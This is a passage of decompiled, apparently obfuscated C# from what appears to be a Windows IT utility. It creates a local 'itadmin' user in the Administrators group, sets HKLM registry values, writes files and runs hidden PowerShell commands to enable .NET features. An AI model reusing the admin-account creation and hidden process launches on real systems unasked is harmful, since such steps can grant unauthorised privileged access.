			((AuthenticablePrincipal)val2).SetPassword(password);
			((AuthenticablePrincipal)val2).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val2).Save();
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex2);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val3 = null;
			try
			{
				val3 = GroupPrincipal.FindByIdentity(val, "Administrators");
				if (val3 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val3.get_Members().Contains(val, (IdentityType)0, text))
					{
						Console.WriteLine("Administrators already contains " + text);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val3.get_Members().Add(val2);
					((Principal)val3).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex3)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex3);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val3).Dispose();
			((Principal)val2).Dispose();
			val.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		}
	}

	private static void smethod_131(string regPath, string name, string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(name) != value)
			{
				registryKey.SetValue(name, value, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	public static void smethod_132(string FileName, byte[] ByteArray)
	{
		if (File.Exists(FileName))
		{
			File.Delete(FileName);
		}
		FileStream fileStream = new FileStream(FileName, FileMode.Create);
		int num = ByteArray.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			fileStream.WriteByte(ByteArray[i]);
		}
		fileStream.Close();
	}

	public static void smethod_133()
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell Install-WindowsFeature Net-Framework-Core -source \\network\\share\\sxs & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell Dism /online /Enable-Feature /FeatureName:NetFx4 /All & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_134()
	{
		try
		{
			Class45.smethod_3();
		}
		catch (Exception)
		{
		}
	}

	[CompilerGenerated]
	internal static string smethod_135(int releaseKey)
	{
		if (releaseKey >= 528040)
		{
			return "4.8 or later";
		}
		if (releaseKey >= 461808)
		{
			return "4.7.2";
		}
		if (releaseKey >= 461308)
		{
			return "4.7.1";
		}
		if (releaseKey >= 460798)
		{
			return "4.7";
		}
		if (releaseKey >= 394802)
		{
			return "4.6.2";
		}
		if (releaseKey >= 394254)
		{
			return "4.6.1";
		}
		if (releaseKey >= 393295)
		{
			return "4.6";
		}
		if (releaseKey >= 379893)
		{
			return "4.5.2";
		}
		if (releaseKey >= 378675)
		{
			return "4.5.1";
		}
		if (releaseKey >= 378389)
		{
			return "4.5";
		}
		return "No 4.5 or later version detected";
	}
}
